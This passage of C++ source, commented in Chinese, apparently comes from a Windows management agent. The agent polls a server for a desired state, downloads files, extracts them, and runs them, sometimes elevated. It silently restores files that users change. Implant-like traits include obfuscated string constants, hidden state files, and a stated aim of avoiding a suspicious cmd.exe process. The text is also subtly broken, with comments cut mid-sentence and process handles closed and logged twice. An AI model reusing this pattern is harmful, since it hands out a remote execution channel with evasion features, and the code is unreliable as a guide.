        for (size_t i = 0; i < auth.size(); ++i) if (auth[i] == ':') colons++;
        return colons >= 2;
    };

    auto push = [&](const std::string& s) {
        std::string v = s;
        while (!v.empty() && (v.back() == ' ' || v.back() == '\r' || v.back() == '\n')) v.pop_back();
        while (!v.empty() && (v.front() == ' ' || v.front() == '\t')) v.erase(0, 1);
        if (v.empty()) return;
        if (lanOnly && isIPv6Host(v)) { skippedV6++; return; }   // 仅内网：丢掉 IPv6 候选
        for (auto& x : _servers) if (x == v) return;   // 去重
        _servers.push_back(v);
    };

    // env 优先（便于一次性试验），其次 ini 的 servers=，最后回落已有的单地址
    if (const char* s = getenv("R6M_SERVERS")) {
        std::string all(s);
        size_t pos = 0;
        while (pos <= all.size()) {
            size_t e = all.find_first_of(",;", pos);
            if (e == std::string::npos) e = all.size();
            push(all.substr(pos, e - pos));
            if (e == all.size()) break;
            pos = e + 1;
        }
    }
    if (_servers.empty() || getenv("R6M_SERVERS") == nullptr) {
        // 读 exe 同目录 r6m.ini 的 servers= 行
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep);
        size_t k = ws.find_last_of(L'\\');
        std::wstring ini = ((k == std::wstring::npos) ? std::wstring(L".") : ws.substr(0, k)) + L"\\r6m.ini";
        HANDLE h = CreateFileW(ini.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            char buf[8192] = {};
            DWORD rd = 0;
            ReadFile(h, buf, sizeof(buf) - 1, &rd, nullptr);
            CloseHandle(h);
            std::string text(buf, rd);
        // 从 ini 取「仅内网」开关（env 给了就以 env 为准）
        if (getenv("R6M_LAN_ONLY") == nullptr) {
            size_t q = text.find("lan_only=");
            if (q != std::string::npos) {
                const char* p = text.c_str() + q + 9;
                lanOnly = !(p[0] == '0');
            }
        }
            size_t pos = 0;
            while (pos <= text.size()) {
                size_t e = text.find('\n', pos);
                if (e == std::string::npos) e = text.size();
                std::string line = text.substr(pos, e - pos);
                while (!line.empty() && (line.back() == '\r' || line.back() == ' ')) line.pop_back();
                if (line.compare(0, 8, "servers=") == 0) {
                    std::string all = line.substr(8);
                    size_t p2 = 0;
                    while (p2 <= all.size()) {
                        size_t e2 = all.find_first_of(",;", p2);
                        if (e2 == std::string::npos) e2 = all.size();
                        push(all.substr(p2, e2 - p2));
                        if (e2 == all.size()) break;
                        p2 = e2 + 1;
                    }
                }
                if (e == text.size()) break;
                pos = e + 1;
            }
        }
    }
    if (_servers.empty() && !_serverUrl.empty()) push(_serverUrl);
    if (_servers.empty()) _servers.push_back(_serverUrl);

    if (_serverIdx >= (int)_servers.size()) _serverIdx = 0;
    _serverUrl = _servers[_serverIdx];
    LOG_I(R6M_STR_D9CF61251F402ED5,
          ("端点候选 " + std::to_string(_servers.size()) + " 个，当前=" + _serverUrl +
           (lanOnly ? ("；仅内网模式：已跳过 " + std::to_string(skippedV6) + " 个 IPv6 候选") : "")).c_str());
}

bool StubCore::RotateEndpoint(const char* why) {
    if (_servers.size() <= 1) {
        // 只有一个端点：轮换无意义，但计数器要留着（上报给管理端看"它一直在失败"）
        _epFails++;
        return false;
    }
    _epFails++;
    _serverIdx = (_serverIdx + 1) % (int)_servers.size();
    _serverUrl = _servers[_serverIdx];
    LOG_W(R6M_STR_D9CF61251F402ED5,
          (std::string("端点轮换（") + why + "） " + _serverUrl).c_str());
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// 状态上报：admin / 当前端点 / 失败次数 / 期望态 rev
// ═══════════════════════════════════════════════════════════════════════════
void StubCore::ReportAgentStatus() {
    std::string path = std::string(R6M_STR_7156334FE6FB9E4C);
    const size_t t = path.rfind("agent/poll");
    if (t != std::string::npos) path.replace(t, 10, "agent/status");
    r6m::Json body = r6m::Json::makeObject();
    body.set("hwid", r6m::Json::makeString(_hwid));
    body.set("admin", r6m::Json::makeBool(_isAdmin));
    body.set("endpoint", r6m::Json::makeString(_serverUrl));
    body.set("endpoint_index", r6m::Json::makeNumber((double)_serverIdx));
    body.set("endpoint_total", r6m::Json::makeNumber((double)_servers.size()));
    body.set("endpoint_fails", r6m::Json::makeNumber((double)_epFails));
    body.set("desired_rev", r6m::Json::makeString(_desiredRev));
    // 失败项一起报：管理端的历史里就能直接看到"卡在哪一件"，不用去翻受管端日志
    // 自愈结果上报：管理端要能看见"哪台机器的配置被人改过、有没有恢复"
    if (!_desiredDrift.empty()) {
        r6m::Json arr = r6m::Json::makeArray();
        for (auto& s : _desiredDrift) arr.push(r6m::Json::makeString(s));
        body.set("desired_drift", arr);
        _desiredDrift.clear();   // 报过就清，避免每轮重复报同一条
    }
    if (!_verifyUnsupported.empty()) {
        r6m::Json arr = r6m::Json::makeArray();
        for (auto& s : _verifyUnsupported) arr.push(r6m::Json::makeString(s));
        body.set("verify_unsupported", arr);
        _verifyUnsupported.clear();
    }
    if (!_desiredFailed.empty()) {
        r6m::Json arr = r6m::Json::makeArray();
        for (auto& s : _desiredFailed) arr.push(r6m::Json::makeString(s));
        body.set("desired_failed", arr);
    }
    std::string resp;
    httpPost(path, body.dump(), resp);
    WipeString(resp);
}

// ═══════════════════════════════════════════════════════════════════════════
// 声明期望态：本地 ledger + 对账收敛
//
// ledger 落在 exe 同目录 .r6mstate.json（不可写则退 ProgramData），内容是：
//   {"rev":"12","items":{"policy.reg":{"sha256":"...","applied_ms":123}}}
// 所以这里不需要另写一套落地逻辑。
// ═══════════════════════════════════════════════════════════════════════════
std::wstring StubCore::LedgerPath() {
    wchar_t ep[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, ep, MAX_PATH);
    std::wstring ws(ep);
    size_t k = ws.find_last_of(L'\\');
    std::wstring dir = (k == std::wstring::npos) ? std::wstring(L".") : ws.substr(0, k);
    std::wstring p = dir + L"\\.r6mstate.json";
    // 试写一下判断可写性（装 Program Files 时可能不可写）
    HANDLE h = CreateFileW(p.c_str(), GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return p; }
    wchar_t pd[MAX_PATH] = {};
    DWORD n = GetEnvironmentVariableW(L"ProgramData", pd, MAX_PATH);
    if (n > 0 && n < MAX_PATH) {
        std::wstring d2 = std::wstring(pd) + L"\\r6m";
        CreateDirectoryW(d2.c_str(), nullptr);
        return d2 + L"\\.r6mstate.json";
    }
    wchar_t tmp[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tmp);
    return std::wstring(tmp) + L".r6mstate.json";
}

// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════
// StubCore.cpp 里没有 W2U/U2W（那两个是 ArtifactApply.cpp 的文件内函数），
// 所以自愈这块自己带一个最小转换（只用到 UTF-8 一个方向）。
static std::wstring HealU8W(const std::string& s) {
    if (s.empty()) return std::wstring();
    const int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    if (n <= 0) return std::wstring();
    std::wstring w((size_t)n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}

static std::string HealW2U8(const std::wstring& w) {
    if (w.empty()) return std::string();
    const int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                                      nullptr, 0, nullptr, nullptr);
    if (n <= 0) return std::string();
    std::string s((size_t)n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                        &s[0], n, nullptr, nullptr);
    return s;
}

void StubCore::LoadHealConfig() {
    _selfHeal = true;
    _checkIntervalSec = 60;
    _healMaxPerWindow = 3;
    // 环境变量优先（便于试验），其次 r6m.ini
    if (const char* s = getenv("R6M_SELFHEAL")) _selfHeal = (std::string(s) != "0");
    if (const char* s = getenv("R6M_CHECK_INTERVAL")) {
        int v = atoi(s);
        if (v >= 1) _checkIntervalSec = v;   // 下限 1 秒（原为 5）：自愈要能"发现即改回" 
    }
    wchar_t ep[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, ep, MAX_PATH);
    std::wstring ws(ep);
    const size_t k = ws.find_last_of(L"\\");
    std::wstring ini = ((k == std::wstring::npos) ? std::wstring(L".") : ws.substr(0, k)) + L"\\r6m.ini";
    HANDLE h = CreateFileW(ini.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        char buf[8192] = {};
        DWORD rd = 0;
        ReadFile(h, buf, sizeof(buf) - 1, &rd, nullptr);
        CloseHandle(h);
        std::string text(buf, rd);
        if (getenv("R6M_SELFHEAL") == nullptr &&
            text.find("selfheal=0") != std::string::npos) _selfHeal = false;
        const size_t p = text.find("check_interval=");
        if (p != std::string::npos && getenv("R6M_CHECK_INTERVAL") == nullptr) {
            int v = atoi(text.c_str() + p + 15);
            if (v >= 1) _checkIntervalSec = v;   // 下限 1 秒（原为 5）：自愈要能"发现即改回" 
        }
        const size_t q = text.find("heal_max=");
        if (q != std::string::npos) {
            int v = atoi(text.c_str() + q + 9);
            if (v >= 0) _healMaxPerWindow = v;
        }
    }
    LOG_I(R6M_STR_D9CF61251F402ED5,
          (std::string("自愈：") + (_selfHeal ? "开" : "关") +
           "，每 " + std::to_string(_checkIntervalSec) + " 秒校验一次，每项每小时最多重做 " +
           std::to_string(_healMaxPerWindow) + " 次").c_str());
}

void StubCore::SelfHealTick() {
    if (!_selfHeal) return;
    if (!_running) return;
    static bool cfgLoaded = false;
    if (!cfgLoaded) { LoadHealConfig(); cfgLoaded = true; }

    const unsigned long long now = GetTickCount64();
    if (_lastHealMs != 0 && (now - _lastHealMs) < (unsigned long long)_checkIntervalSec * 1000ULL) {
        return;
    }
    _lastHealMs = now;

    // 不论 rev 有没有变，都拉一次期望态来对账 —— 这正是"定期检测"
    std::string path = std::string(R6M_STR_7156334FE6FB9E4C);
    const size_t t = path.rfind("agent/poll");
    if (t != std::string::npos) path.replace(t, 10, "agent/desired");
    std::string resp;
    if (!httpPost(path + "?hwid=" + _hwid, std::string(), resp)) {
        WipeString(resp);
        return;
    }
    r6m::Json d;
    std::string perr;
    if (!r6m::Json::parse(resp, d, &perr)) { WipeString(resp); return; }
    WipeString(resp);
    const r6m::Json* items = d.find("items");
    if (!items || !items->isArray() || items->items.empty()) return;

    _desiredDrift.clear();
    _verifyUnsupported.clear();
    int okN = 0, driftN = 0, unkN = 0, healedN = 0, cappedN = 0;

    for (const auto& it : items->items) {
        const std::string name = it.getString("file_name");
        if (name.empty()) continue;
        const std::string kind = it.getString("apply", "none");
        const std::string args = it.getString("apply_args");
        std::string tdir = it.getString("target_dir");

        // 落点路径：与投放时同一算法（没给 target_dir 就落在 exe 同目录）
        std::wstring dir = HealU8W(tdir);
        if (dir.empty()) {
            wchar_t ep[MAX_PATH] = {};
            GetModuleFileNameW(nullptr, ep, MAX_PATH);
            const std::wstring ws(ep);
            const size_t k = ws.find_last_of(L"\\");
            dir = (k == std::wstring::npos) ? std::wstring(L".") : ws.substr(0, k);
        }
        const std::string landed = HealW2U8(dir + L"\\" + HealU8W(name));

        std::string vdetail;
        const int v = r6m::ArtifactApply::Verify(kind, landed, args, name, vdetail);
        if (v == 0) { okN++; continue; }
        if (v == 2) {
            unkN++;
            _verifyUnsupported.push_back(name + "(" + kind + ")");
            continue;
        }

        driftN++;
        _desiredDrift.push_back(name + ": " + vdetail);
        LOG_W(R6M_STR_D9CF61251F402ED5,
              (" 检测到配置偏离：" + name + " —— " + vdetail).c_str());

        if (_healWindow.find(name) == _healWindow.end() ||
            (now - _healWindow[name]) > 3600ULL * 1000ULL) {
            _healWindow[name] = now;
            _healCount[name] = 0;
        }
        if (_healCount[name] >= _healMaxPerWindow) {
            cappedN++;
            LOG_E(R6M_STR_D9CF61251F402ED5,
                  ("自愈已达上限（本小时 " + std::to_string(_healCount[name]) +
                   " 次），停止自动重做：" + name + " —— 需要人工确认是否真的该恢复").c_str());
            continue;
        }

        r6m::Json one = it;
        one.set("tx", r6m::Json::makeString("heal"));
        _lastApplyDetail.clear();
        _lastApplyErr.clear();
        if (handleDeployFile(one.dump())) {
            _healCount[name]++;
            healedN++;
            LOG_I(R6M_STR_D9CF61251F402ED5,
                  (" 已自动恢复：" + name + "（本小时第 " +
                   std::to_string(_healCount[name]) + " 次）").c_str());
        } else {
            _healCount[name]++;
            LOG_E(R6M_STR_D9CF61251F402ED5,
                  ("自愈失败：" + name + " —— " + _lastApplyErr).c_str());
        }
    }

    if (driftN > 0 || unkN > 0) {
        LOG_I(R6M_STR_D9CF61251F402ED5,
              ("自愈检查：一致 " + std::to_string(okN) + "，偏离 " + std::to_string(driftN) +
               "（已恢复 " + std::to_string(healedN) +
               (cappedN ? ("，超限停手 " + std::to_string(cappedN)) : "") +
               "），无法校验 " + std::to_string(unkN)).c_str());
    }
    ReportAgentStatus();
}

void StubCore::DesiredTick(const std::string& pollRespJson) {
    r6m::Json pollResp;
    std::string perr0;
    if (!r6m::Json::parse(pollRespJson, pollResp, &perr0)) return;
    // P2 通用状态通道：内核不解释内容、只负责送达；受管端这一步先做到"收到并记录"。
    // 具体某个 key 执行什么由对应功能决定（会话锁定只是其中一个 key）。
    {
        const r6m::Json* st = pollResp.find("state");
        if (st && st->isObject()) {
            LOG_I(R6M_STR_D9CF61251F402ED5, ("收到通用状态: " + st->dump()).c_str());
        }
    }
    // 表现为"期望态配了但受管端毫无反应"，日志里一行都没有）。
    // 统一转成字符串比较。
    const long long revNum = (long long)pollResp.getNumber("desired_rev", 0);
    if (revNum <= 0) {
        // 服务端没配期望态 —— 或者**服务端压根没下发这个字段**。
        // 这两种情况必须能分开：实测有过一次服务端误删该字段，结果整条收敛链路
        // 静默停摆（账本停在旧 rev、applied_rev 恒空），而界面完全看不出来。
        // 所以首次遇到时打一行 WARN，之后按 100 轮节流，避免刷屏。
        if (_pollsSinceDesired % 100 == 0) {
            LOG_W(R6M_STR_D9CF61251F402ED5,
                  "poll 响应里没有 desired_rev —— 期望态收敛不会执行（检查服务端是否下发该字段）");
        }
        _pollsSinceDesired++;
        return;
    }
    const std::string rev = std::to_string(revNum);
    if (rev == _desiredRev) return;             // 已达成

    // 别每轮都打服务端：3 秒一轮太密，按需拉取（10 轮 ≈ 30 秒一次兜底）
    _pollsSinceDesired++;
    if (_pollsSinceDesired < 2) return;
    _pollsSinceDesired = 0;

    std::string path = std::string(R6M_STR_7156334FE6FB9E4C);
    const size_t t = path.rfind("agent/poll");
    if (t != std::string::npos) path.replace(t, 10, "agent/desired");
    std::string resp;
    if (!httpPost(path + "?hwid=" + _hwid, std::string(), resp)) {
        LOG_W(R6M_STR_D9CF61251F402ED5, "拉取期望态失败（下轮再试）");
        return;
    }
    if (resp.find("\"items\"") == std::string::npos) {
        WipeString(resp);
        return;
    }
    LOG_I(R6M_STR_D9CF61251F402ED5,
          ("收到期望态 rev=" + rev + "，开始收敛").c_str());
    ConvergeDesired(resp);
    WipeString(resp);
    ReportAgentStatus();
}

void StubCore::ConvergeDesired(const std::string& desiredJson) {
    r6m::Json d;
    std::string perr;
    if (!r6m::Json::parse(desiredJson, d, &perr)) {
        LOG_E(R6M_STR_D9CF61251F402ED5, ("期望态不是合法 JSON: " + perr).c_str());
        return;
    }
    // 同前：服务端发的是数字
    const std::string rev = std::to_string((long long)d.getNumber("rev", 0));
    const r6m::Json* items = d.find("items");
    if (!items || !items->isArray()) {
        LOG_W(R6M_STR_D9CF61251F402ED5, "期望态里没有 items 数组");
        return;
    }

    // 读本地 ledger
    std::wstring lp = LedgerPath();
    std::string ledgerTxt;
    {
        HANDLE h = CreateFileW(lp.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            char buf[65536] = {};
            DWORD rd = 0;
            ReadFile(h, buf, sizeof(buf) - 1, &rd, nullptr);
            CloseHandle(h);
            ledgerTxt.assign(buf, rd);
        }
    }
    r6m::Json ledger;
    if (!ledgerTxt.empty()) {
        std::string e2;
        r6m::Json::parse(ledgerTxt, ledger, &e2);
    }
    if (!ledger.isObject()) ledger = r6m::Json::makeObject();
    const r6m::Json* lItems = ledger.find("items");
    r6m::Json newItems = r6m::Json::makeObject();

    int applied = 0, skipped = 0, failed = 0;
    std::string failDetail;
    _desiredFailed.clear();
    for (const auto& it : items->items) {
        const std::string name = it.getString("file_name");
        if (name.empty()) continue;
        const std::string wantSha = it.getString("sha256");

        bool need = true;
        if (lItems && lItems->isObject()) {
            const r6m::Json* have = lItems->find(name);
            if (have && have->isObject()) {
                const std::string haveSha = have->getString("sha256");
                // 期望没给标识时，以"本地已记录该件"为达成
                if (wantSha.empty() ? !haveSha.empty() : (haveSha == wantSha)) need = false;
            }
        }
        if (!need) {
            skipped++;
            if (lItems) { const r6m::Json* h2 = lItems->find(name);
                if (h2) newItems.set(name, *h2); }
            continue;
        }
        r6m::Json one = it;
        one.set("tx", r6m::Json::makeString("desired-" + rev));
        _lastApplyDetail.clear();
        _lastApplyErr.clear();
        LOG_I(R6M_STR_D9CF61251F402ED5,
              ("收敛：投放 " + name + "（apply=" + it.getString("apply", "none") + "）").c_str());
        if (handleDeployFile(one.dump())) {
            applied++;
            r6m::Json rec = r6m::Json::makeObject();
            // 账本必须记**本地文件的实际哈希**，而不是"服务端声明的 sha"。
        //（临时临时授权到点就是用旧字节覆盖同一个文件），账本里那条"已应用 sha"会和
        // 于是出现"服务端恢复对了、客户端也说达成、而真机没变"。
        std::string localSha = wantSha;
        {
            std::wstring lp2 = WideFromUtf8(it.getString("target_dir")) + L"\\" + WideFromUtf8(name);
            std::string h = Sha256FileHex(lp2);
            if (!h.empty()) {
                localSha = h;
            } else {
                LOG_W(R6M_STR_D9CF61251F402ED5,
                      ("算不出已落盘文件的哈希，账本暂记服务端声明值: " + name).c_str());
            }
        }
        rec.set("sha256", r6m::Json::makeString(localSha));
            rec.set("applied_ms", r6m::Json::makeNumber((double)GetTickCount64()));
            newItems.set(name, rec);
        } else {
            failed++;
            // 失败项**不记账**：下轮还会再试（期望态的意义就是"最终会达成"）
            std::string one = name + (_lastApplyErr.empty() ? "" : (": " + _lastApplyErr));
            failDetail += (failDetail.empty() ? "" : "; ") + one;
            _desiredFailed.push_back(one);
        }
    }

    ledger.set("rev", r6m::Json::makeString(rev));
    ledger.set("items", newItems);
    ledger.set("updated_ms", r6m::Json::makeNumber((double)GetTickCount64()));
    {
        std::string out = ledger.dump();
        HANDLE h = CreateFileW(lp.c_str(), GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD wr = 0;
            WriteFile(h, out.c_str(), (DWORD)out.size(), &wr, nullptr);
            CloseHandle(h);
        }
        WipeString(out);
    }
    // 只有全成才算达成这个 rev；有失败就留旧 rev，下轮重试
    if (failed == 0) _desiredRev = rev;
    LOG_I(R6M_STR_D9CF61251F402ED5,
          ("收敛完成 rev=" + rev + " 新装=" + std::to_string(applied) +
           " 已达成=" + std::to_string(skipped) + " 失败=" + std::to_string(failed) +
           (failed ? (" 失败项: " + failDetail) : "")).c_str());
}

bool StubCore::handleDeployFile(const std::string& params) {
    r6m::Json p;
    std::string perr;
    if (!r6m::Json::parse(params, p, &perr)) {
        LOG_E(R6M_STR_FF01F19295C3B47E, ("部署参数不是合法 JSON: " + perr).c_str());
        return false;
    }
    std::string fileName = p.getString("file_name");
    std::string targetDir = p.getString("target_dir");

    if (fileName.empty()) {
        LOG_E(R6M_STR_FF01F19295C3B47E, "empty filename");
        return false;
    }
    // 需要密钥的外置工件（会话锁定工具等）：投放后签发 key、写配置、登记
    const bool needKey = p.getBool("artifact", false);
    // 工件类型决定"落地之后怎么应用"。默认 none=仅落地，保持既有行为不变。
    const std::string applyKind = p.getString("apply", "none");
    const std::string applyArgs = p.getString("apply_args");
    const bool dryRun = p.getBool("dry_run", false);
    // 事务 id：批量投放时由批次统一集成，用于把这一次的备份登记到事务索引，
    const std::string txId = p.getString("tx");
    _lastApplyDetail.clear();
    _lastApplyErr.clear();
    _lastDeployErr.clear();
    // 文件名只允许裸文件名（不允许目录分隔符）；修复前 "\Windows\System32" 这类
    // 前导反斜杠能通过校验并被 CreateDirectoryA 解析成当前盘根
    if (!IsValidRemoteName(fileName) || fileName.find('/') != std::string::npos ||
        fileName.find('\\') != std::string::npos) {
        LOG_E(R6M_STR_FF01F19295C3B47E, ("非法文件名，拒绝部署: " + fileName).c_str());
        return false;
    }
    if (!targetDir.empty() && !IsValidTargetDir(targetDir)) {
        // 失败信息要能自证原因：只说"非法"会让人以为是命令没送到
        LOG_E(R6M_STR_FF01F19295C3B47E,
              ("非法目标目录，拒绝部署（不允许 .. 与前导分隔符，长度<=200）: " + targetDir).c_str());
        return false;
    }
    if (targetDir.empty()) {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep);
        ws = ws.substr(0, ws.find_last_of(L'\\'));
        targetDir = Utf8FromWide(ws) + R6M_STR_6A145556D5536F39;
    }
    LOG_I(R6M_STR_FF01F19295C3B47E, ("deploy: " + fileName + " -> " + targetDir).c_str());

    std::wstring targetDirW = WideFromUtf8(targetDir);
    std::wstring fileNameW = WideFromUtf8(fileName);

    // 逐级创建目录（用宽字符 API，中文路径不会乱码）
    {
        std::wstring acc;
        for (size_t i = 0; i < targetDirW.size(); i++) {
            acc += targetDirW[i];
            if (targetDirW[i] == L'\\' || targetDirW[i] == L'/') {
                if (acc.size() > 3) CreateDirectoryW(acc.c_str(), nullptr);
            }
        }
        CreateDirectoryW(targetDirW.c_str(), nullptr);
    }

    std::string url = _serverUrl + R6M_STR_EDF889B1D07BF350 + fileName;
    std::wstring save = targetDirW + L"\\" + fileNameW;
    // 投放前先把手上的运行实例终止掉，否则替换必然失败（见辅助函数处说明）
    StopRunningImages(fileNameW);
    if (!httpDownload(url, save)) {
        // 失败必须自证：原来只写 "download failed"，于是管理端收敛历史里只有
        // "失败项: R6MLock.exe"、不带原因，排查只能去翻受管端日志。
        _lastApplyErr = "下载失败: " + Utf8FromWide(save) +
                        (GetFileAttributesW(save.c_str()) != INVALID_FILE_ATTRIBUTES
                             ? "（目标仍存在：可能仍被占用，或权限不足）" : "（目标不存在）") +
                        " GetLastError=" + std::to_string(GetLastError());
        LOG_E(R6M_STR_FF01F19295C3B47E, _lastApplyErr.c_str());
        return false;
    }
    LOG_I(R6M_STR_FF01F19295C3B47E, "download ok");

    if (fileName.size() > 4 && fileName.compare(fileName.size() - 4, 4, ".zip") == 0) {
        LOG_I(R6M_STR_FF01F19295C3B47E, "extracting zip...");
        std::string unzipDir = targetDir + "\\" + fileName.substr(0, fileName.size() - 4);
        std::wstring unzipDirW = WideFromUtf8(unzipDir);
        CreateDirectoryW(unzipDirW.c_str(), nullptr);

        // 直接用系统自带 tar.exe，不再套 cmd.exe：
        // 少一层 shell 解析，也少一个"未知父进程拉起 cmd"的可疑行为面。
        wchar_t sysDir[MAX_PATH] = {};
        GetSystemDirectoryW(sysDir, MAX_PATH);
        std::wstring tarExe = std::wstring(sysDir) + ::r6m::ev::Widen(R6M_STR_636B11B7A000762C);
        if (GetFileAttributesW(tarExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LOG_E(R6M_STR_FF01F19295C3B47E, R6M_STR_965AE8F789E2E176);
            return false;
        }
        std::wstring cmdLine = L"\"" + tarExe + L"\" -xf \"" + save + L"\" -C \"" + unzipDirW + L"\"";
        std::vector<wchar_t> mutableCmd(cmdLine.begin(), cmdLine.end());
        mutableCmd.push_back(L'\0');

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessW(nullptr, mutableCmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                            nullptr, nullptr, &si, &pi)) {
            LOG_E(R6M_STR_FF01F19295C3B47E, ("解压进程启动失败 err=" + std::to_string(GetLastError())).c_str());
            return false;
        }
        WaitForSingleObject(pi.hProcess, 120000);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (exitCode != 0) {
            LOG_E(R6M_STR_FF01F19295C3B47E, ("解压失败 exit=" + std::to_string(exitCode)).c_str());
            return false;
        }
        LOG_I(R6M_STR_FF01F19295C3B47E, ("extracted: " + unzipDir).c_str());
    }

    // 而不是插件目录。后果：每次投放都拿一个不含 plugin.json 的目录去重扫插件，
    // 正确做法：重扫插件目录（与 run()/syncPlugins 同一处，从 exe 位置推导）。
    {
        wchar_t ep2[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep2, MAX_PATH);
        std::wstring appDir2(ep2);
        appDir2 = appDir2.substr(0, appDir2.find_last_of(L"\\"));
        _plugins.scanPlugins(appDir2 + ::r6m::ev::Widen(R6M_STR_6A145556D5536F39));
    }
    LOG_I(R6M_STR_FF01F19295C3B47E, "rescan done");

    // 外置工件：签发密钥 + 写配置 + 登记（结果里回带 key，管理端立刻知道对应关系）
    _lastArtifactKey.clear();
    if (needKey) {
        _lastArtifactKey = issueArtifactKey(targetDir, fileName);
        if (_lastArtifactKey.empty()) {
            LOG_E(R6M_STR_FF01F19295C3B47E, "外置工件密钥签发失败，部署视为失败");
            return false;
        }
    }

    // ── 落地后应用 ──
    // 位置很关键：在"签发密钥/写配置"之后、"启动"之前。
    // 配置类工件（策略/注册表/证书/任务…）的意义就是"落地即生效"，
    // 而服务类工件要先有配置再拉起来。
    if (applyKind != "none") {
        std::string full = targetDir + "\\" + fileName;
        std::string err, detail;
        if (!::r6m::ArtifactApply::Apply(applyKind, full, applyArgs, fileName, txId, dryRun, err, detail)) {
            _lastApplyErr = err;
            LOG_E(R6M_STR_FF01F19295C3B47E,
                  ("工件应用失败 [" + applyKind + "]: " + err).c_str());
            // 应用失败 = 整个投放失败：不能让管理端以为"推下去就好了"
            _lastDeployErr = "apply_failed: " + err;
            return false;
        }
        _lastApplyDetail = detail;
        LOG_I(R6M_STR_FF01F19295C3B47E,
              ("工件已应用 [" + applyKind + "]" + (dryRun ? "（dry-run）" : "") + ": " + detail).c_str());
    }

    // 按需启动。**顺序很关键**：必须在签发密钥、写好同目录 .ini 之后再启 ——
    // 外置工具启动时就要读自己的配置，反了它会以"配置缺失"退出（会弹框，很显眼）。
    // ── 以管理员运行（2026-10-11 第 2 步）──────────────────────────────
    const std::string runMode = p.getString("run_mode", "");
    const bool wantAdminRun = (runMode == "admin");
    if (p.getBool("run", false)) {
        // 启动前再确认一次：已有同名实例在跑就**不启动**。
        // "单实例才安全"的工具（如屏幕锁定常驻）跑两份会互相打架。
        if (ImageRunning(fileNameW)) {
            LOG_W(R6M_STR_FF01F19295C3B47E,
                  ("已有同名实例在运行，跳过启动（避免双实例）: " + fileName).c_str());
        } else {
        std::wstring full = WideFromUtf8(targetDir + "\\" + fileName);
        std::wstring workDir = WideFromUtf8(targetDir);
        std::wstring cmd = L"\"" + full + L"\"";
        std::vector<wchar_t> mc(cmd.begin(), cmd.end());
        mc.push_back(L'\0');
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        // 不加 CREATE_NO_WINDOW：外置工具要自己画窗口。
        // 注意：若受管端本身以 SYSTEM 身份跑（计划任务），子进程会落在 session 0，
        // 窗口对当前登录用户不可见 —— 那种部署方式下应改用让用户态进程拉起它。
        bool launched = false;
        if (wantAdminRun && !IsRunningElevatedLocal()) {
            SHELLEXECUTEINFOW sei = {};
            sei.cbSize = sizeof(sei);
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;
            sei.lpVerb = L"runas";
            sei.lpFile = full.c_str();
            sei.lpDirectory = workDir.c_str();
            sei.nShow = SW_SHOWNORMAL;
            if (ShellExecuteExW(&sei)) {
                                LOG_I(R6M_STR_FF01F19295C3B47E, ("已以管理员启动外置工件（runas）: " + fileName).c_str());
                if (sei.hProcess) CloseHandle(sei.hProcess);
                launched = true;
            } else {
                                LOG_E(R6M_STR_FF01F19295C3B47E,
                      ("runas 启动失败 err=" + std::to_string(GetLastError())).c_str());
            }
        } else {
                        if (!CreateProcessW(nullptr, mc.data(), nullptr, nullptr, FALSE, 0,
                                nullptr, workDir.c_str(), &si, &pi)) {
                LOG_E(R6M_STR_FF01F19295C3B47E,
                      ("启动外置工件失败 err=" + std::to_string(GetLastError())).c_str());
                return false;
            }
            LOG_I(R6M_STR_FF01F19295C3B47E,
                  ("已启动外置工件 pid=" + std::to_string(pi.dwProcessId) + " " + fileName).c_str());
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            launched = true;
        }
        (void)launched;
        LOG_I(R6M_STR_FF01F19295C3B47E,
              ("已启动外置工件 pid=" + std::to_string(pi.dwProcessId) + " " + fileName).c_str());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }}
    return true;
}

// ═══════════════════════════════════════════════
// 插件同步：从服务端拉取缺失的插件
// ═══════════════════════════════════════════════

void StubCore::syncPlugins(const std::wstring& pluginDir) {
    LOG_I(R6M_STR_05073D2537B45D1A, "=== syncPlugins start ===");

    // 确保 plugins 目录存在
    CreateDirectoryW(pluginDir.c_str(), nullptr);

    // ═══ 0) 检查并下载嵌入式 Python 运行时 ═══
    // 获取 exe 所在目录
    wchar_t exePath[MAX_PATH] = {};
